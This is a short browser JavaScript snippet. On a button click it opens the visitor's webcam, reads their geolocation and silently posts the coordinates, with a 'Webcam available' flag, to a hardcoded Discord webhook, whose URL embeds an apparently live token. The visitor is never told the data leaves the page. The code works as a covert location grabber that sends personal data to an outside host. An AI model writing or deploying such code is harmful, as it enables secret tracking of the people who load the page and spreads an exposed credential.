document.getElementById('startButton').addEventListener('click', async () => {
    try {
        // Check for webcam and get access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const videoElement = document.createElement('video');
        videoElement.srcObject = stream;
        videoElement.play();
        document.getElementById('webcamContainer').appendChild(videoElement);

        // Get location data
        if ("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude } = position.coords;

                // Send information to Discord webhook
                const discordWebhookUrl = 'https://discord.com/api/webhooks/1506854427846508635/3PPDpwgkhYKFhs6cuK6Bl3sIb73YQ0ZYqEj6MIx6ivSqKjUWXQiig9q9vQkXi5Aq2mWe';
                const data = {
                    content: `Webcam available\nLatitude: ${latitude}, Longitude: ${longitude}`
                };

                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });

                // Display location information
                document.getElementById('locationInfo').textContent = `Location: Latitude ${latitude}, Longitude ${longitude}`;
            }, (error) => {
                console.error('Error getting location:', error);
                document.getElementById('locationInfo').textContent = 'No location available';
            });
        } else {
            console.error('Geolocation is not supported');
            document.getElementById('locationInfo').textContent = 'Geolocation not supported';
        }
    } catch (error) {
        console.error('Error accessing webcam:', error);
        document.getElementById('webcamContainer').innerHTML = '<p>No webcam available</p>';
    }
});
